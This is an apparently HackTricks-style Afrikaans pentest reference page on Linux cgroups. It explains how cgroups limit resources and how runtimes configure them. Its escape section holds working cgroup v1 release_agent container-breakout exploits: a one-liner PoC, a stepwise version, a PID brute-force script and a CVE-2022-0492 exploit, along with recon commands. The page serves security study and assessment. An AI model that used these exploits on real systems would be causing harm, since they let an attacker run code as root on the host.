# cgroups

{{#include ../../../../banners/hacktricks-training.md}}

## Overview

Linux **control groups** is die kernel-meganisme wat gebruik word om prosesse saam te groepeer vir rekeningkunde, beperking, prioritisering en beleidstoepassing. As namespaces hoofsaaklik gaan oor die isolering van die siening van hulpbronne, gaan cgroups hoofsaaklik oor die beheer van **hoeveel** van daardie hulpbronne 'n stel prosesse mag verbruik en, in sommige gevalle, **watter klasse hulpbronne** hulle oorhoofse mee kan interakteer. Containers vertrou konstant op cgroups, selfs wanneer die gebruiker nooit direk daarna kyk nie, omdat byna elke moderne runtime 'n manier nodig het om aan die kernel te sê "hierdie prosesse behoort aan hierdie workload, en dit is die hulpbronreëls wat op hulle van toepassing is".

Dit is hoekom container engines 'n nuwe container in sy eie cgroup-subboom plaas. Sodra die prosesboom daar is, kan die runtime geheue begrens, die aantal PIDs beperk, gewigte toeken aan CPU-gebruik, I/O reguleer, en toesteltoegang beperk. In 'n produksie-omgewing is dit noodsaaklik vir beide multi-tenant veiligheid en eenvoudige operasionele higiëne. 'n Container sonder sinvolle hulpbronbeheersmaatreëls kan in staat wees om geheue uit te put, die stelsel met prosesse te oorstroom, of CPU en I/O te monopoliseer op maniere wat die host of aangrensende workloads onstabiel maak.

Vanaf 'n sekuriteitsperspektief is cgroups op twee aparte maniere belangrik. Eerstens maak swak of afwesige hulpbronlimiete eenvoudige denial-of-service-aanvalle moontlik. Tweedens het sommige cgroup-funksies, veral in ouer **cgroup v1**-opstellings, histories kragtige breakout-primitiewe geskep wanneer hulle van binne 'n container skryfbaar was.

## v1 Vs v2

Daar is twee hoof cgroup-modelle in die veld. **cgroup v1** gee toegang tot verskeie controller-hiërargieë, en ouer exploit writeups draai dikwels om die vreemde en soms oormagagtige semantiek wat daar beskikbaar is. **cgroup v2** stel 'n meer verenigde hiërargie en oor die algemeen skoner gedrag voor. Moderne verspreidings verkies toenemend cgroup v2, maar gemengde of erfenisomgewings bestaan steeds, wat beteken dat beide modelle steeds relevant is wanneer mens werklike stelsels hersien.

Die verskil maak saak omdat sommige van die bekendste container breakout-stories, soos misbruik van **`release_agent`** in cgroup v1, baie spesifiek gekoppel is aan ouer cgroup-gedrag. 'n Leser wat 'n cgroup exploit op 'n blog sien en dit dan blindelings toepas op 'n moderne cgroup v2-only stelsel, sal waarskynlik verkeerd verstaan wat werklik op die teiken moontlik is.

## Inspection

Die vinnigste manier om te sien waar jou huidige shell sit is:
```bash
cat /proc/self/cgroup
findmnt -T /sys/fs/cgroup
```
Die `/proc/self/cgroup`-lêer toon die cgroup-paaie wat met die huidige proses geassosieer is. Op ’n moderne cgroup v2 host sal jy dikwels ’n verenigde inskrywing sien. Op ouer of hibriede hosts kan jy verskeie v1-controller-paaie sien. Sodra jy die pad ken, kan jy die ooreenstemmende lêers onder `/sys/fs/cgroup` ondersoek om beperkings en huidige gebruik te sien.

Op ’n cgroup v2 host is die volgende opdragte nuttig:
```bash
ls -l /sys/fs/cgroup
cat /sys/fs/cgroup/cgroup.controllers
cat /sys/fs/cgroup/cgroup.subtree_control
```
Hierdie lêers openbaar watter controllers bestaan en watter aan child cgroups gedelegeer is. Hierdie delegasie-model maak saak in rootless- en systemd-beheerde omgewings, waar die runtime moontlik slegs die subset van cgroup-funksionaliteit kan beheer wat die ouer-hiërargie werklik delegeer.

## Laboratorium

Een manier om cgroups in die praktyk waar te neem, is om 'n geheue-beperkte container te laat loop:
```bash
docker run --rm -it --memory=256m debian:stable-slim bash
cat /proc/self/cgroup
cat /sys/fs/cgroup/memory.max 2>/dev/null || cat /sys/fs/cgroup/memory.limit_in_bytes 2>/dev/null
```
Jy kan ook 'n PID-limited container probeer:
```bash
docker run --rm -it --pids-limit=64 debian:stable-slim bash
cat /sys/fs/cgroup/pids.max 2>/dev/null
```
Hierdie voorbeelde is nuttig omdat hulle help om die runtime-vlag met die kernel-lêerinterface te verbind. Die runtime dwing die reël nie deur towerskrag af nie; dit skryf die relevante cgroup-instellings en laat dan die kernel dit teen die prosesboom afdwing.

## Runtime Gebruik

Docker, Podman, containerd, en CRI-O vertrou almal op cgroups as deel van normale werking. Die verskille gaan gewoonlik nie oor of hulle cgroups gebruik nie, maar oor **watter standaardinstellings hulle kies**, **hoe hulle met systemd interaksie het**, **hoe rootless delegation werk**, en **hoeveel van die konfigurasie op enjinvlak versus orkestreringsvlak beheer word**.

In Kubernetes word hulpbronversoeke en limiete uiteindelik cgroup-konfigurasie op die node. Die pad van Pod YAML na kernel-afdwinging gaan deur die kubelet, die CRI runtime, en die OCI runtime, maar cgroups bly die kernel-meganisme wat uiteindelik die reël toepas. In Incus/LXC-omgewings word cgroups ook wyd gebruik, veral omdat system containers dikwels ’n rykere prosesboom en meer VM-agtige operasionele verwagtinge openbaar.

## Misconfigurasies en Ontsnappinge

Die klassieke cgroup-sekuriteitsverhaal is die skryfbare **cgroup v1 `release_agent`** meganisme. In daardie model, as ’n aanvaller na die regte cgroup-lêers kon skryf, `notify_on_release` kon aktiveer, en die pad wat in `release_agent` gestoor is kon beheer, kon die kernel uiteindelik ’n aanvaller-gekose pad in die aanvanklike namespaces op die host uitvoer wanneer die cgroup leeg geword het. Daarom gee ouer skrywes soveel aandag aan cgroup-kontroller-skryfbaarheid, mount-opsies, en namespace/capability-toestande.

Selfs wanneer `release_agent` nie beskikbaar is nie, maak cgroup-foute steeds saak. Te breë toesteltoegang kan host-toestelle vanaf die container bereikbaar maak. Ontbreekende geheue- en PID-limiete kan ’n eenvoudige kode-uitvoering in ’n host DoS omskakel. Swak cgroup-delegasie in rootless scenario's kan ook verdedigers mislei om te aanvaar dat ’n beperking bestaan wanneer die runtime nooit eintlik in staat was om dit toe te pas nie.

### `release_agent` Agtergrond

Die `release_agent` tegniek is slegs van toepassing op **cgroup v1**. Die basiese idee is dat wanneer die laaste proses in ’n cgroup beëindig en `notify_on_release=1` gestel is, die kernel die program uitvoer wie se pad in `release_agent` gestoor is. Daardie uitvoering gebeur in die **initial namespaces on the host**, wat maak dat ’n skryfbare `release_agent` in ’n container-ontsnapping primitief omskep word.

Vir die tegniek om te werk, benodig die aanvaller gewoonlik:

- ’n skryfbare **cgroup v1** hiërargie
- die vermoë om ’n sub-cgroup te skep of te gebruik
- die vermoë om `notify_on_release` te stel
- die vermoë om ’n pad in `release_agent` te skryf
- ’n pad wat vanaf die host se oogpunt na ’n uitvoerbare oplos

### Klassieke PoC

Die historiese eenreël PoC is:
```bash
d=$(dirname $(ls -x /s*/fs/c*/*/r* | head -n1))
mkdir -p "$d/w"
echo 1 > "$d/w/notify_on_release"
t=$(sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab)
touch /o
echo "$t/c" > "$d/release_agent"
cat <<'EOF' > /c
#!/bin/sh
ps aux > "$t/o"
EOF
chmod +x /c
sh -c "echo 0 > $d/w/cgroup.procs"
sleep 1
cat /o
```
Hierdie PoC skryf 'n payload path in `release_agent`, aktiveer die cgroup release, en lees dan die uitvoerlêer wat op die host gegenereer is terug.

### Leesbare stap-vir-stap deurloop

Dieselfde idee is makliker om te verstaan as dit in stappe opgebreek word.

1. Skep en maak 'n skryfbare cgroup gereed:
```bash
mkdir /tmp/cgrp
mount -t cgroup -o rdma cgroup /tmp/cgrp    # or memory if available in v1
mkdir /tmp/cgrp/x
echo 1 > /tmp/cgrp/x/notify_on_release
```
2. Identifiseer die host-pad wat ooreenstem met die container-lêerstelsel:
```bash
host_path=$(sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab)
echo "$host_path/cmd" > /tmp/cgrp/release_agent
```
3. Drop a payload wat vanaf die host path sigbaar sal wees:
```bash
cat <<'EOF' > /cmd
#!/bin/sh
ps aux > /output
EOF
chmod +x /cmd
```
4. Trigger execution deur die cgroup leeg te maak:
```bash
sh -c "echo $$ > /tmp/cgrp/x/cgroup.procs"
sleep 1
cat /output
```
Die effek is dat die payload aan die gasheerkant uitgevoer word met root-regte op die gasheer. In 'n werklike exploit skryf die payload gewoonlik 'n bewyslêer, spawn 'n reverse shell, of wysig die gasheerstoestand.

### Relatiewe pad-variant wat `/proc/<pid>/root` gebruik

In sommige omgewings is die gasheerpad na die container-lêerstelsel nie duidelik nie of is dit weggesteek deur die storage driver. In daardie geval kan die payload-pad uitgedruk word deur `/proc/<pid>/root/...`, waar `<pid>` 'n host PID is wat behoort aan 'n proses in die huidige container. Dit is die basis van die relatiewe-pad brute-force variant:
```bash
#!/bin/sh

OUTPUT_DIR="/"
MAX_PID=65535
CGROUP_NAME="xyx"
CGROUP_MOUNT="/tmp/cgrp"
PAYLOAD_NAME="${CGROUP_NAME}_payload.sh"
PAYLOAD_PATH="${OUTPUT_DIR}/${PAYLOAD_NAME}"
OUTPUT_NAME="${CGROUP_NAME}_payload.out"
OUTPUT_PATH="${OUTPUT_DIR}/${OUTPUT_NAME}"

sleep 10000 &

cat > ${PAYLOAD_PATH} << __EOF__
#!/bin/sh
OUTPATH=\$(dirname \$0)/${OUTPUT_NAME}
ps -eaf > \${OUTPATH} 2>&1
__EOF__

chmod a+x ${PAYLOAD_PATH}

mkdir ${CGROUP_MOUNT}
mount -t cgroup -o memory cgroup ${CGROUP_MOUNT}
mkdir ${CGROUP_MOUNT}/${CGROUP_NAME}
echo 1 > ${CGROUP_MOUNT}/${CGROUP_NAME}/notify_on_release

TPID=1
while [ ! -f ${OUTPUT_PATH} ]
do
if [ $((${TPID} % 100)) -eq 0 ]
then
echo "Checking pid ${TPID}"
if [ ${TPID} -gt ${MAX_PID} ]
then
echo "Exiting at ${MAX_PID}"
exit 1
fi
fi
echo "/proc/${TPID}/root${PAYLOAD_PATH}" > ${CGROUP_MOUNT}/release_agent
sh -c "echo \$\$ > ${CGROUP_MOUNT}/${CGROUP_NAME}/cgroup.procs"
TPID=$((${TPID} + 1))
done

sleep 1
cat ${OUTPUT_PATH}
```
Die relevante truuk hier is nie die brute force self nie, maar die padvorm: `/proc/<pid>/root/...` laat die kernel toe om 'n lêer binne die container filesystem vanaf die host namespace op te los, selfs wanneer die direkte host-stoorpad nie vooraf bekend is nie.

### CVE-2022-0492 Variasie

In 2022 het CVE-2022-0492 getoon dat skryf na `release_agent` in cgroup v1 nie korrek geverifieer het vir `CAP_SYS_ADMIN` in die **inisiële** gebruiker-namespace nie. Dit het die tegniek baie meer bereikbaar gemaak op kwesbare kernels, omdat 'n container-proses wat 'n cgroup-hiërargie kon mount, `release_agent` kon skryf sonder om reeds voorregte in die host gebruiker-namespace te hê.

Minimale exploit:
```bash
apk add --no-cache util-linux
unshare -UrCm sh -c '
mkdir /tmp/c
mount -t cgroup -o memory none /tmp/c
echo 1 > /tmp/c/notify_on_release
echo /proc/self/exe > /tmp/c/release_agent
(sleep 1; echo 0 > /tmp/c/cgroup.procs) &
while true; do sleep 1; done
'
```
Op 'n kwesbare kernel voer die host `/proc/self/exe` uit met host root privileges.

Vir praktiese misbruik, begin deur te kontroleer of die omgewing nog skryfbare cgroup-v1-paaie of gevaarlike device access blootstel:
```bash
mount | grep cgroup
find /sys/fs/cgroup -maxdepth 3 -name release_agent 2>/dev/null -exec ls -l {} \;
find /sys/fs/cgroup -maxdepth 3 -writable 2>/dev/null | head -n 50
ls -l /dev | head -n 50
```
As `release_agent` teenwoordig en beskryfbaar is, is jy reeds in legacy-breakout-gebied:
```bash
find /sys/fs/cgroup -maxdepth 3 -name notify_on_release 2>/dev/null
find /sys/fs/cgroup -maxdepth 3 -name cgroup.procs 2>/dev/null | head
```
As die cgroup-pad self nie 'n escape oplewer nie, is die volgende praktiese gebruik dikwels denial of service of reconnaissance:
```bash
cat /sys/fs/cgroup/pids.max 2>/dev/null
cat /sys/fs/cgroup/memory.max 2>/dev/null
cat /sys/fs/cgroup/cpu.max 2>/dev/null
```
Hierdie opdragte vertel jou vinnig of die werklas ruimte het om fork-bomb uit te voer, geheue aggressief te verbruik, of ’n skryfbare ou cgroup-interface te misbruik.

## Kontroles

Wanneer jy ’n teiken beoordeel, is die doel van die cgroup-kontroles om te bepaal watter cgroup-model in gebruik is, of die container skryfbare controller paths sien, en of ou breakout primitives soos `release_agent` selfs relevant is.
```bash
cat /proc/self/cgroup                                      # Current process cgroup placement
mount | grep cgroup                                        # cgroup v1/v2 mounts and mount options
find /sys/fs/cgroup -maxdepth 3 -name release_agent 2>/dev/null   # Legacy v1 breakout primitive
cat /proc/1/cgroup                                         # Compare with PID 1 / host-side process layout
```
Wat hier interessant is:

- As `mount | grep cgroup` **cgroup v1** toon, word ouer breakout writeups meer relevant.
- As `release_agent` bestaan en bereikbaar is, is dit onmiddellik die moeite werd vir nader ondersoek.
- As die sigbare cgroup-hiërargie skryfbaar is en die container ook sterk capabilities het, verdien die omgewing 'n meer noukeurige ondersoek.

As jy **cgroup v1**, skryfbare controller-mounts, en 'n container vind wat ook sterk capabilities of swak seccomp/AppArmor-beskerming het, verdien daardie kombinasie noukeurige aandag. cgroups word dikwels as 'n vervelige resource-management-onderwerp beskou, maar histories was hulle deel van sommige van die mees insiggewende container escape chains, juis omdat die grens tussen "resource control" en "host influence" nie altyd so skoon was soos mense geglo het nie.

## Runtime-standaarde

| Runtime / platform | Standaardstatus | Standaardgedrag | Algemene manuele verzwakking |
| --- | --- | --- | --- |
| Docker Engine | By verstek geaktiveer | Containers word outomaties in cgroups geplaas; hulpbronlimiete is opsioneel tensy met flags gestel | weglating van `--memory`, `--pids-limit`, `--cpus`, `--blkio-weight`; `--device`; `--privileged` |
| Podman | By verstek geaktiveer | `--cgroups=enabled` is die verstek; cgroup namespace-standaarde verskil volgens cgroup-weergawe (`private` op cgroup v2, `host` op sekere cgroup v1-opstellings) | `--cgroups=disabled`, `--cgroupns=host`, verslapte toesteltoegang, `--privileged` |
| Kubernetes | By verstek geaktiveer deur die runtime | Pods en containers word deur die node runtime in cgroups geplaas; fynkorrelige hulpbronbeheer hang af van `resources.requests` / `resources.limits` | weglating van resource requests/limits, bevoorregte toesteltoegang, misconfigurasie van hostvlak runtime |
| containerd / CRI-O | By verstek geaktiveer | cgroups is deel van normale lewensiklusbestuur | direkte runtime-konfigurasies wat toestelbeheer verslap of ouer skryfbare cgroup v1-koppelvlakke blootstel |

Die belangrike onderskeid is dat **cgroup-bestaan** gewoonlik by verstek is, terwyl **bruikbare hulpbronbeperkings** dikwels opsioneel is tensy dit uitdruklik gekonfigureer word.
{{#include ../../../../banners/hacktricks-training.md}}
